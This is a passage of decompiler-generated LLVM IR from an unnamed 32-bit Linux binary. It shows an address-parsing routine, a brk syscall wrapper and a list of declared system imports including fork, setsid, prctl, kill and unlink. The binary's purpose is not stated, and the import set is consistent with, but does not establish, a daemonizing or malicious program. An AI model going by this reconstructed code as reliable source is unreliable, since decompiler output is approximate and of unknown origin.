  %v1_80529ff.lcssa = phi i32 [ 0, %dec_label_pc_80529fb ], [ %v3_8052a02, %dec_label_pc_8052a0e ]
  %v0_8052a0e.lcssa = phi i32 [ %v0_80529eb, %dec_label_pc_80529fb ], [ %v1_8052a0e, %dec_label_pc_8052a0e ]
  %v2_8052a0f.lcssa = phi i8 [ %v2_8052a0f34, %dec_label_pc_80529fb ], [ %v2_8052a0f, %dec_label_pc_8052a0e ]
  %v6_8052a14.lcssa.in = phi i16 [ %v5_8052a1442, %dec_label_pc_80529fb ], [ %v5_8052a14, %dec_label_pc_8052a0e ]
  %v8_8052a1d = sub nsw i32 2, %v2_8052a37
  %v9_8052a1d = and i32 %v8_8052a1d, %v2_8052a37
  %v10_8052a1d = icmp slt i32 %v9_8052a1d, 0
  %v11_8052a1d = icmp eq i32 %v2_8052a37, 3
  %v12_8052a1d = icmp slt i32 %v2_8052a37, 3
  %v3_8052a21 = icmp eq i1 %v12_8052a1d, %v10_8052a1d
  %v4_8052a21 = icmp eq i1 %v11_8052a1d, false
  %v5_8052a21 = and i1 %v4_8052a21, %v3_8052a21
  br i1 %v5_8052a21, label %dec_label_pc_8052a2b, label %dec_label_pc_8052a23

dec_label_pc_8052a23:                             ; preds = %dec_label_pc_8052a1d
  %v10_8052a23 = icmp eq i8 %v2_8052a0f.lcssa, 46
  %v1_8052a26 = icmp eq i1 %v10_8052a23, false
  br i1 %v1_8052a26, label %dec_label_pc_8052a5d, label %dec_label_pc_8052a28

dec_label_pc_8052a28:                             ; preds = %dec_label_pc_8052a23
  br label %dec_label_pc_8052a34

dec_label_pc_8052a2b:                             ; preds = %dec_label_pc_8052a1d
  %v4_8052a2c = icmp ne i8 %v2_8052a0f.lcssa, 0
  %v2_8052a30 = and i16 %v6_8052a14.lcssa.in, 32
  %v3_8052a30 = icmp eq i16 %v2_8052a30, 0
  %or.cond = and i1 %v4_8052a2c, %v3_8052a30
  br i1 %or.cond, label %dec_label_pc_8052a5d, label %dec_label_pc_8052a34

dec_label_pc_8052a34:                             ; preds = %dec_label_pc_8052a2b, %dec_label_pc_8052a28
  %v0_80529eb3 = add i32 %v0_8052a0e.lcssa, 1
  %v2_8052a34 = mul i32 %v0_8052a34, 256
  %v3_8052a37 = add nuw nsw i32 %v2_8052a37, 1
  %v2_8052a3a = or i32 %v1_80529ff.lcssa, %v2_8052a34
  %v7_8052a40 = icmp sgt i32 %v2_8052a37, 3
  br i1 %v7_8052a40, label %dec_label_pc_8052a42, label %dec_label_pc_80529eb

dec_label_pc_8052a42:                             ; preds = %dec_label_pc_8052a34
  %v4_8052a47 = icmp eq i32 %arg2, 0
  br i1 %v4_8052a47, label %dec_label_pc_8052a5f, label %dec_label_pc_8052a4e

dec_label_pc_8052a4e:                             ; preds = %dec_label_pc_8052a42
  %v1_8052a52 = call i32 @llvm.bswap.i32(i32 %v2_8052a3a)
  %v2_8052a54 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8052a52, i32* %v2_8052a54, align 4
  br label %dec_label_pc_8052a5f

dec_label_pc_8052a5d:                             ; preds = %dec_label_pc_8052a2b, %dec_label_pc_8052a23, %dec_label_pc_80529eb, %dec_label_pc_80529ff, %dec_label_pc_80529d1
  br label %dec_label_pc_8052a5f

dec_label_pc_8052a5f:                             ; preds = %dec_label_pc_8052a42, %dec_label_pc_8052a4e, %dec_label_pc_8052a5d
  %v0_8052a64 = phi i32 [ 1, %dec_label_pc_8052a42 ], [ 1, %dec_label_pc_8052a4e ], [ 0, %dec_label_pc_8052a5d ]
  ret i32 %v0_8052a64

; uselistorder directives
  uselistorder i32 %v2_8052a11, { 1, 0 }
  uselistorder i32 %v6_8052a0f, { 1, 0 }
  uselistorder i32 %v1_8052a0e, { 0, 2, 1 }
  uselistorder i32 %v1_8052a06, { 1, 0 }
  uselistorder i32 %v3_8052a02, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052a37, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_80529ee.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 18, 20, 19, 2, 0, 3, 4, 5, 21, 16, 6, 7, 9, 8, 17, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 46, { 1, 0 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 16, 17, 18, 19, 20, 21, 22, 11, 4, 8, 14, 15, 5 }
  uselistorder i32 10, { 0, 6, 5, 3, 8, 1, 7, 10, 11, 12, 4, 13, 2, 9 }
  uselistorder i16 0, { 0, 2, 1, 6, 7, 8, 9, 5, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 10, 0, 4, 5, 40, 11, 12, 3, 30, 28, 36, 32, 6, 7, 8, 9, 23, 24, 25, 26, 27, 29, 31, 33, 34, 35, 37, 38, 39, 13, 14, 15, 16, 17, 18, 19, 20, 1, 2, 21, 22, 41 }
  uselistorder i8 0, { 15, 16, 47, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 7, 27, 14, 40, 1, 28, 29, 30, 41, 42, 43, 38, 39, 37, 44, 0, 45, 2, 32, 34, 31, 5, 33, 6, 35, 36, 3, 4, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 2, { 35, 38, 11, 39, 1, 66, 13, 67, 14, 33, 0, 20, 30, 21, 31, 22, 32, 2, 3, 4, 40, 5, 6, 7, 15, 16, 41, 8, 9, 18, 10, 23, 17, 19, 26, 24, 25, 42, 43, 44, 45, 51, 52, 57, 54, 56, 55, 58, 59, 60, 36, 37, 53, 61, 62, 34, 63, 28, 27, 46, 47, 48, 49, 50, 29, 12, 64, 65 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052a5f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a5d, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80529ff, { 1, 0 }
  uselistorder label %dec_label_pc_80529eb, { 1, 0 }
}

define i32 @function_8052a65(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a65:
  %v0_8052a68 = call i32 @function_80502a7()
  %v0_8052a6d = load i32, i32* @edx, align 4
  %v4_8052a74 = call i32 @function_8050332(i32 %v0_8052a68, i32 %arg1, i32 %v0_8052a6d, i32 %v0_8052a6d)
  ret i32 %v4_8052a74

; uselistorder directives
  uselistorder i32* @edx, { 126, 21, 0, 2, 22, 23, 24, 1, 13, 14, 16, 12, 120, 25, 129, 130, 134, 133, 128, 28, 29, 3, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 4, 43, 44, 26, 27, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 5, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 6, 101, 102, 103, 104, 105, 106, 107, 132, 15, 17, 18, 131, 125, 127, 108, 19, 20, 117, 118, 119, 116, 10, 9, 8, 7, 121, 11, 122, 124, 123, 109, 110, 111, 112, 113, 114, 115, 135 }
}

define i32 @function_8052a7d() local_unnamed_addr {
dec_label_pc_8052a7d:
  %v0_8052a7d = load i32, i32* @eax, align 4
  %v1_8052a7d = add i32 %v0_8052a7d, 28
  %v2_8052a7d = inttoptr i32 %v1_8052a7d to i32*
  %v3_8052a7d = load i32, i32* %v2_8052a7d, align 4
  store i32 %v3_8052a7d, i32* @global_var_8054958.73, align 8
  %v1_8052a86 = add i32 %v0_8052a7d, 44
  %v2_8052a86 = inttoptr i32 %v1_8052a86 to i32*
  %v3_8052a86 = load i32, i32* %v2_8052a86, align 4
  store i32 %v3_8052a86, i32* @global_var_805495c.74, align 4
  ret i32 %v3_8052a86

; uselistorder directives
  uselistorder i32 44, { 10, 3, 2, 7, 9, 8, 4, 5, 6, 0, 1 }
  uselistorder i32 28, { 21, 10, 11, 9, 12, 13, 14, 6, 7, 8, 4, 1, 5, 3, 2, 15, 16, 17, 18, 19, 20, 0 }
}

define i32 @function_8052a8f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a8f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052a8f = load i32, i32* @ebx, align 4
  store i32 %v0_8052a8f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8052aa2 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052aa2, i32* @global_var_8054418.71, align 8
  %v7_8052aad = icmp ult i32 %v1_8052aa2, %arg1
  %v1_8052aaf = icmp eq i1 %v7_8052aad, false
  br i1 %v1_8052aaf, label %dec_label_pc_8052abf, label %dec_label_pc_8052ab1

dec_label_pc_8052ab1:                             ; preds = %dec_label_pc_8052a8f
  %v1_8052ab1 = call i32 @function_805078b(i32 %v0_8052a8f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052ab9 = inttoptr i32 %v1_8052ab1 to i32*
  store i32 12, i32* %v1_8052ab9, align 4
  %v0_8052abf.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052ac3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052abf

dec_label_pc_8052abf:                             ; preds = %dec_label_pc_8052a8f, %dec_label_pc_8052ab1
  %v2_8052ac3 = phi i32 [ %v0_8052a8f, %dec_label_pc_8052a8f ], [ %v2_8052ac3.pre, %dec_label_pc_8052ab1 ]
  %v0_8052abf = phi i32 [ 0, %dec_label_pc_8052a8f ], [ %v0_8052abf.pre, %dec_label_pc_8052ab1 ]
  store i32 %v2_8052ac3, i32* @ebx, align 4
  ret i32 %v0_8052abf

; uselistorder directives
  uselistorder i32 %v1_8052aa2, { 1, 0 }
  uselistorder i32 12, { 24, 17, 18, 12, 13, 14, 11, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 64, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 9, 63, 10, 15, 16, 19, 20, 21, 65, 66, 76, 77, 87, 67, 73, 74, 1, 70, 72, 2, 71, 78, 22, 23, 68, 69, 75, 79, 80, 8, 81, 82, 84, 85, 3, 83, 4, 5, 6, 7, 86, 0 }
  uselistorder i32* @global_var_8054418.71, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052abf, { 1, 0 }
}

define i32 @function_8052ac5() local_unnamed_addr {
dec_label_pc_8052ac5:
  %v0_8052ac8 = load i32, i32* @eax, align 4
  %v1_8052aca = sub i32 0, %v0_8052ac8
  %v1_8052acc = call i32 @function_805078b(i32 ptrtoint (i32* @0 to i32))
  %v2_8052ad1 = inttoptr i32 %v1_8052acc to i32*
  store i32 %v1_8052aca, i32* %v2_8052ad1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_805078b, { 30, 29, 47, 13, 28, 27, 46, 12, 50, 11, 5, 10, 45, 44, 43, 51, 9, 21, 6, 26, 8, 7, 25, 22, 24, 23, 49, 48, 42, 41, 40, 39, 38, 20, 4, 3, 37, 19, 36, 35, 34, 2, 15, 33, 32, 14, 17, 18, 1, 0, 31, 16 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 7, 22, 8, 9, 10, 23, 24, 25, 26, 27, 28, 11, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
}

define i32 @function_8052ae0() local_unnamed_addr {
dec_label_pc_8052ae0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8052aec = load i32, i32* @global_var_80542c4.58, align 4
  %v10_8052af1 = icmp eq i32 %v0_8052aec, -1
  br i1 %v10_8052af1, label %dec_label_pc_8052b02, label %dec_label_pc_8052af6.preheader

dec_label_pc_8052af6.preheader:                   ; preds = %dec_label_pc_8052ae0
  br label %dec_label_pc_8052af6

dec_label_pc_8052af6:                             ; preds = %dec_label_pc_8052af6.preheader, %dec_label_pc_8052af6
  %v4_8052af9 = phi i32 [ %v0_8052aec, %dec_label_pc_8052af6.preheader ], [ %v2_8052afb, %dec_label_pc_8052af6 ]
  %v0_8052af6 = phi i32 [ ptrtoint (i32* @global_var_80542c4.58 to i32), %dec_label_pc_8052af6.preheader ], [ %v1_8052af6, %dec_label_pc_8052af6 ]
  %v1_8052af6 = add i32 %v0_8052af6, -4
  call void @__pseudo_call(i32 %v4_8052af9)
  %v1_8052afb = inttoptr i32 %v1_8052af6 to i32*
  %v2_8052afb = load i32, i32* %v1_8052afb, align 4
  %v10_8052afd = icmp eq i32 %v2_8052afb, -1
  %v1_8052b00 = icmp eq i1 %v10_8052afd, false
  br i1 %v1_8052b00, label %dec_label_pc_8052af6, label %dec_label_pc_8052b02.loopexit

dec_label_pc_8052b02.loopexit:                    ; preds = %dec_label_pc_8052af6
  %v2_8052b02.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052b02

dec_label_pc_8052b02:                             ; preds = %dec_label_pc_8052b02.loopexit, %dec_label_pc_8052ae0
  %v2_8052b02 = phi i32 [ %v2_8052b02.pre, %dec_label_pc_8052b02.loopexit ], [ %tmp6, %dec_label_pc_8052ae0 ]
  ret i32 %v2_8052b02

; uselistorder directives
  uselistorder i32 %v0_8052aec, { 1, 0 }
  uselistorder i1 false, { 138, 35, 36, 37, 39, 38, 0, 40, 41, 42, 30, 31, 155, 156, 157, 158, 160, 14, 161, 162, 159, 154, 139, 26, 140, 141, 142, 2, 144, 145, 1, 146, 147, 148, 149, 4, 150, 151, 152, 153, 3, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 43, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 7, 69, 70, 13, 72, 71, 75, 73, 74, 8, 15, 76, 77, 143, 27, 5, 28, 29, 106, 107, 17, 32, 33, 34, 95, 96, 108, 6, 78, 79, 80, 102, 19, 97, 98, 20, 99, 100, 21, 92, 93, 103, 109, 104, 9, 10, 89, 11, 90, 91, 94, 101, 105, 110, 111, 112, 113, 23, 137, 114, 22, 115, 116, 117, 118, 119, 120, 121, 122, 12, 123, 124, 125, 126, 127, 128, 129, 130, 136, 131, 134, 81, 82, 83, 84, 85, 86, 87, 24, 88, 18, 132, 133, 135, 163, 25, 16, 164 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 44, 45, 46, 47, 4, 48, 1, 43, 12, 49, 5, 50, 51, 52, 6, 0, 2, 3, 53, 54, 55, 56, 57, 58, 59, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 ptrtoint (i32* @global_var_80542c4.58 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 25, 26, 0, 91, 176, 54, 92, 18, 55, 93, 56, 94, 57, 95, 58, 96, 59, 97, 60, 98, 61, 99, 62, 100, 63, 101, 19, 20, 7, 6, 64, 65, 102, 66, 103, 67, 104, 27, 1, 105, 53, 68, 69, 106, 107, 108, 9, 109, 8, 110, 177, 11, 12, 111, 10, 112, 28, 162, 29, 113, 163, 31, 32, 21, 16, 33, 70, 34, 114, 30, 164, 4, 115, 116, 22, 23, 24, 117, 13, 15, 35, 2, 71, 159, 160, 170, 171, 72, 161, 36, 73, 118, 74, 119, 75, 120, 51, 52, 121, 76, 122, 77, 123, 78, 124, 79, 125, 80, 126, 81, 127, 82, 128, 83, 129, 84, 130, 85, 131, 86, 132, 87, 133, 88, 134, 89, 135, 37, 169, 5, 14, 50, 172, 165, 41, 136, 166, 39, 47, 137, 48, 138, 40, 49, 139, 173, 38, 140, 141, 142, 143, 167, 168, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 42, 174, 155, 175, 3, 17, 43, 156, 44, 45, 46, 157, 158, 90 }
  uselistorder i32 1, { 182, 183, 40, 113, 114, 297, 0, 298, 115, 401, 184, 8, 7, 9, 185, 16, 15, 14, 186, 17, 187, 188, 5, 190, 189, 42, 192, 191, 18, 193, 33, 194, 64, 195, 43, 196, 59, 197, 62, 198, 61, 199, 200, 20, 19, 21, 132, 47, 202, 201, 204, 203, 13, 205, 6, 207, 206, 54, 208, 212, 211, 210, 209, 99, 402, 403, 404, 215, 214, 213, 24, 23, 116, 216, 219, 218, 217, 60, 117, 175, 290, 110, 225, 224, 223, 222, 221, 220, 56, 57, 133, 226, 176, 229, 228, 227, 55, 134, 300, 301, 302, 230, 53, 303, 304, 118, 305, 306, 307, 27, 25, 26, 108, 299, 135, 72, 73, 74, 75, 136, 119, 308, 309, 310, 311, 233, 232, 231, 96, 95, 97, 137, 234, 3, 4, 139, 312, 313, 314, 315, 316, 317, 318, 319, 320, 138, 321, 322, 323, 324, 325, 120, 326, 327, 100, 121, 328, 329, 330, 331, 122, 123, 332, 333, 334, 237, 236, 235, 37, 34, 35, 38, 36, 124, 125, 238, 126, 127, 242, 241, 240, 239, 51, 140, 177, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 291, 292, 255, 46, 45, 44, 256, 257, 141, 142, 258, 259, 128, 261, 260, 30, 143, 262, 263, 11, 264, 12, 265, 63, 266, 29, 267, 98, 268, 82, 269, 28, 270, 22, 271, 39, 10, 273, 272, 41, 274, 52, 275, 76, 277, 276, 58, 278, 89, 279, 31, 280, 32, 50, 282, 281, 71, 376, 129, 377, 378, 109, 384, 103, 48, 49, 335, 379, 180, 90, 92, 91, 94, 93, 380, 181, 65, 67, 66, 69, 68, 83, 336, 337, 338, 339, 364, 365, 159, 160, 145, 381, 382, 155, 370, 371, 147, 374, 375, 149, 372, 373, 385, 157, 293, 294, 158, 153, 295, 296, 154, 366, 367, 151, 368, 369, 152, 156, 150, 148, 146, 144, 383, 386, 161, 387, 162, 388, 390, 400, 389, 391, 392, 393, 394, 395, 396, 398, 163, 399, 84, 86, 87, 85, 88, 397, 178, 283, 70, 340, 341, 342, 343, 170, 169, 107, 101, 344, 345, 130, 105, 106, 102, 346, 347, 131, 104, 171, 348, 349, 350, 351, 179, 352, 353, 354, 355, 166, 167, 356, 357, 168, 173, 172, 358, 359, 164, 360, 361, 362, 165, 363, 286, 285, 284, 78, 79, 81, 77, 80, 287, 1, 174, 2, 111, 112, 405, 289, 288 }
  uselistorder label %dec_label_pc_8052af6, { 1, 0 }
}

define i32 @function_8052b06() local_unnamed_addr {
entry:
  %v0_8052b09 = load i32, i32* @ebx, align 4
  %v1_8052b0a = call i32 @function_80480b0(i32 %v0_8052b09)
  store i32 %v1_8052b0a, i32* @eax, align 4
  %v0_8052b15 = call i32 @function_80480c0()
  ret i32 %v0_8052b15

; uselistorder directives
  uselistorder i32* @eax, { 7, 14, 40, 42, 43, 44, 45, 47, 11, 48, 0, 46, 4, 6, 41, 15, 17, 18, 16, 19, 20, 21, 27, 22, 23, 25, 26, 24, 1, 12, 13, 8, 2, 9, 10, 30, 29, 31, 35, 36, 37, 32, 33, 34, 28, 49, 38, 39, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 255, 43, 171, 44, 256, 257, 5, 258, 259, 260, 6, 45, 80, 81, 230, 231, 46, 223, 261, 262, 263, 95, 264, 409, 265, 266, 224, 225, 410, 214, 213, 411, 412, 413, 215, 226, 227, 232, 233, 211, 414, 350, 27, 28, 415, 433, 434, 7, 47, 172, 8, 173, 174, 444, 445, 76, 446, 48, 157, 49, 96, 97, 0, 416, 417, 418, 50, 212, 166, 51, 175, 419, 1, 82, 83, 52, 420, 421, 53, 54, 423, 422, 14, 15, 424, 427, 98, 158, 428, 430, 429, 12, 13, 431, 432, 55, 435, 18, 159, 56, 84, 437, 440, 439, 16, 17, 269, 270, 271, 272, 273, 85, 274, 275, 276, 29, 30, 31, 32, 267, 99, 268, 100, 176, 277, 40, 278, 86, 177, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 87, 88, 290, 178, 302, 179, 180, 101, 160, 181, 102, 161, 57, 182, 291, 292, 58, 59, 103, 162, 42, 293, 294, 295, 60, 61, 104, 163, 41, 296, 77, 297, 38, 298, 299, 301, 183, 300, 2, 438, 425, 426, 216, 217, 219, 218, 19, 20, 3, 89, 220, 221, 222, 303, 228, 229, 184, 185, 234, 235, 236, 237, 238, 239, 240, 241, 186, 242, 243, 351, 436, 244, 352, 245, 246, 247, 441, 90, 407, 248, 249, 408, 304, 353, 442, 443, 62, 63, 250, 65, 64, 66, 187, 354, 39, 9, 67, 188, 68, 189, 338, 190, 191, 305, 306, 309, 192, 310, 91, 325, 326, 355, 356, 357, 33, 193, 404, 347, 348, 327, 194, 339, 332, 195, 336, 334, 341, 358, 359, 251, 252, 253, 254, 342, 343, 344, 328, 329, 330, 331, 333, 335, 337, 340, 345, 346, 21, 22, 349, 69, 196, 360, 70, 197, 361, 362, 364, 71, 401, 402, 403, 78, 363, 198, 365, 366, 367, 368, 369, 370, 371, 372, 378, 167, 373, 374, 375, 376, 377, 379, 199, 200, 72, 201, 381, 382, 383, 384, 385, 92, 34, 386, 387, 388, 202, 324, 396, 397, 398, 399, 389, 390, 391, 395, 400, 35, 93, 380, 73, 164, 203, 204, 168, 169, 311, 312, 26, 24, 205, 25, 23, 206, 207, 313, 314, 315, 316, 317, 318, 319, 94, 208, 320, 321, 322, 323, 165, 209, 307, 308, 36, 392, 393, 394, 10, 37, 170, 11, 74, 4, 405, 406, 75, 210, 79, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 447, 448, 449, 450, 451, 452, 453, 454 }
  uselistorder i32* @ebx, { 13, 77, 78, 44, 45, 18, 79, 0, 80, 81, 237, 82, 83, 84, 238, 15, 239, 240, 241, 242, 243, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 46, 1, 47, 48, 49, 14, 244, 245, 198, 199, 85, 86, 246, 247, 248, 11, 12, 274, 275, 276, 277, 9, 2, 8, 259, 268, 272, 273, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 264, 265, 87, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 3, 102, 103, 88, 89, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 4, 116, 117, 118, 119, 120, 121, 122, 123, 149, 150, 151, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 10, 134, 135, 136, 137, 138, 5, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 262, 263, 16, 17, 37, 38, 39, 40, 41, 42, 43, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 200, 201, 260, 261, 68, 202, 203, 69, 70, 71, 266, 267, 233, 234, 72, 73, 235, 236, 152, 153, 204, 205, 269, 270, 271, 74, 158, 159, 206, 188, 181, 185, 186, 187, 183, 184, 189, 190, 75, 76, 191, 182, 192, 193, 194, 195, 196, 197, 207, 208, 209, 210, 211, 7, 212, 213, 215, 214, 225, 226, 227, 6, 228, 216, 217, 218, 219, 220, 221, 222, 223, 224, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 154, 155, 156, 157, 229, 230, 231, 232 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
